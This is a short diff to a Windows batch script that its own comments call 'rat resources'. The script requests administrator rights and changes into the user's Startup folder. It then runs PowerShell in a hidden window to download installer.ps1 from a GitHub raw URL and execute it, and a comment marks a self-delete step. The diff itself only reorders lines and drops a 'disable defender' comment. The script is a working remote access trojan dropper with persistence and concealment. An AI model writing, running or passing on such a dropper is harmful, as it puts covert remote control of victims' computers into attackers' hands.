@@ -1,6 +1,6 @@
+@echo off
 REM get admin permissions for script
 REM created by : jfrdgh (@bigmanlc on dc)
-@echo off
 
 :: BatchGotAdmin
 :-------------------------------------
@@ -30,7 +30,6 @@ if '%errorlevel%' NEQ '0' (
     pushd "%CD%"
     CD /D "%~dp0"
 
-REM disable defender
 
 REM cd to startup
 set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
@@ -38,6 +37,7 @@ cd %STARTUP%
 
 REM rat resources
 powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/jfrdgh/Quention-INCOMPLETE-/main/files/installer.ps1 -OutFile installer.ps1"
+cd %STARTUP%
 powershell ./installer.ps1
 
 @REM self delete
